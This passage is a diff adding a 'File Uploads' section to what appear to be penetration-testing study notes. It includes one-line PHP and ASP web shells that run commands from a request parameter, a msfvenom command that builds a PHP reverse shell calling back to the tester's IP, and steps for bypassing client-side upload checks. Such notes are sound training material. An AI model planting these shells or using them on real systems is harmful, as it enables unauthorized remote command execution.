@@ -1001,3 +1001,88 @@ description:
 >Invoke-DOSfuscation> encoding
 >Invoke-DOSfuscation\Encoding> 1
 >```
+### File Uploads (~1.5 hours)
+
+>[!code]- Find the web app's language
+>1. Enumerate `/index.ext` - where `.ext` is replaced with `php`, `aspx`, `asp` etc.
+>```powershell
+># There may be false negatives
+>ffuf -u http://target.com/index.FUZZ -W /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt
+>```
+>2. Use Wappalyzer (browser extension)
+
+>[!code]- Choose a suitable web shell
+>###### Use a pre-existing one
+>1. [phpbash](https://github.com/Arrexel/phpbash) for a bash-like web shell
+>2. [Seclists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) for various web shells
+>3. [Revshells](https://www.revshells.com/) for various web shells, including shells by Ivan Sincek or PentestMonkey
+>
+>###### Create a custom one
+>```php
+><!--PHP -->
+><!-- executes a command passed to the ?cmd= parameter -->
+><?php system($_REQUEST['cmd']); ?>
+>```
+>
+>```powershell
+># .NET
+># executes a command passed to the ?cmd= parameter
+><% eval request('cmd') %>
+>```
+>
+>```bash
+># powershell
+># -p to set payload language
+># -f to set output file language
+>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
+>```
+###### Bypass front-end validation
+
+>[!code]- Capture and edit the upload request
+>If, when we upload an image, it sends a request like so:
+>
+>![[Images/Pasted image 20250508064152.png]]
+>
+>We can edit the:
+>- `filename="HTB.png` field
+>- `content at the end of the request`
+>
+>![[Images/Pasted image 20250508064328.png]]
+>
+>To change our request into one that uploads PNG data to one that uploads PHP data.
+
+>[!code]- Disable front-end validation
+>###### Identify the problem code
+>For example, if a webpage is preventing us from uploading certain file types, we can inspect the upload form to see the relevant source code:
+>
+>![[Images/Pasted image 20250508064618.png]]
+>
+>```html
+><input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
+>```
+>
+>It appears the `checkFile` function is being run on the input field. This function is written as:
+>
+>```javascript
+>function checkFile(File) {
+>...SNIP...
+>    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
+>        $('#error_message').text("Only images are allowed!");
+>        File.form.reset();
+>        $("#submit").attr("disabled", true);
+>    ...SNIP...
+>    }
+>}
+>```
+>
+>###### Delete the problem code
+>>[!code]- Through the inspector tool
+>>![[Images/Pasted image 20250508065212.png]]
+>
+>(Changes made to the code in this way will not persist through page refreshes).
+
+
+
+
+
+
